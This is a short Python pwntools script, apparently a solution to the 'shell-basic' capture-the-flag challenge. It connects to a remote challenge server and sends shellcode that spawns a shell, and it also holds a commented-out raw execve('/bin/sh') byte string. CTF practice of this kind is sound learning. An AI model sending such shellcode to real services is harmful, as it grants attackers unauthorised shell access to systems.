from pwn import *

# pc = process("./chall")

pc = remote("shell-basic-pwn.wanictf.org", 9004)
context.arch = 'amd64'
context.os = 'linux'
# shellcode = asm(shellcraft.amd64.sh())
# shellcode = asm(shellcraft.amd64.linux.sh())
# shellcode = asm(shellcraft.amd64.linux.sh())
shellcode = asm(shellcraft.sh())
# shellcode = asm(shellcode_bytes)
# shellcode = b'\xeb\x16\x5f\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe5\xff\xff\xff'
print(shellcode)
# shell_code = b""  # PUT YOUR SHELL CODE HERE

pc.sendline(shellcode)
pc.interactive()
